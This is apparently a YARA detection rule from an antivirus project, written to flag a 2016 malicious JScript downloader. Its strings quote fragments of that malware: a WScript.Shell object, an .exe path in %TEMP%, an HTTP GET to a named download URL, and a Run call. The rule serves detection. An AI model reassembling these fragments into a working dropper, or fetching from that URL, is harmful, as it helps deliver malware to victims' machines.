rule sig_20160328_32c8b3deec8e4d368e8d7cb4d10db4ad {
  meta:
    description = "datamaliciousorder - file 20160328_32c8b3deec8e4d368e8d7cb4d10db4ad.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "71cda1af024804104fc7f843515dfcb6992532cab1872e1285b0e8248f926690"

  strings:
    $s1  = "function Rbgbapkm() {return Dexurdrtt[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"sSJxIgGKFlU.exe\";};" fullword ascii
    $s2  = "Ozmdtp[Qbdbyxm](\"GET\", \"http://portal.ofar.com.br/o4psaf\", false);" fullword ascii
    $s3  = "do {WScript[Txmksmxb](Ycebicd() * 11)} while (Ozmdtp[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Dexurdrtt = function Kaqicscyr() {return WScript[Yuuthk](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Abbjv(Yaepxpe, Kgavploam){return Yaepxpe - Kgavploam;};" fullword ascii
    $s6  = "function Txlwomsr(Kcqolovn){Dexurdrtt[\"Run\"](Kcqolovn, Ksbmvaiki, Ksbmvaiki);};" fullword ascii
    $s7  = "function Hpijxwx() {return ((Qyskf == true) && (Qyskf == Cipbhsnyk)) ? 1 : Ksbmvaiki;};" fullword ascii
    $s8  = "var Lroty = false;" fullword ascii
    $s9  = "return Abbjv(Xvybscvom, Nuieod);" fullword ascii
    $s10 = "function Knvgdksg(){return Jjiovsjhho;};" fullword ascii
    $s11 = "var Cipbhsnyk = false;" fullword ascii
    $s12 = "var Qyskf = false;" fullword ascii
    $s13 = "Qyskf = true; " fullword ascii
    $s14 = "function Qhrgcdxo(){return Yuuthk;};" fullword ascii
    $s15 = "function Ycebicd(){return 22;};" fullword ascii
    $s16 = "Cipbhsnyk = true; " fullword ascii
    $s17 = "var Hkdxncxtsd = new this[\"Date\"]();" fullword ascii
    $s18 = "function Cciugo(Czteojcwk) {var Bdqypd = (1, 2, 3, 4, 5, Czteojcwk); return Bdqypd;};" fullword ascii
    $s19 = "function Oewkuu()" fullword ascii
    $s20 = " while (Dceiskn){" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}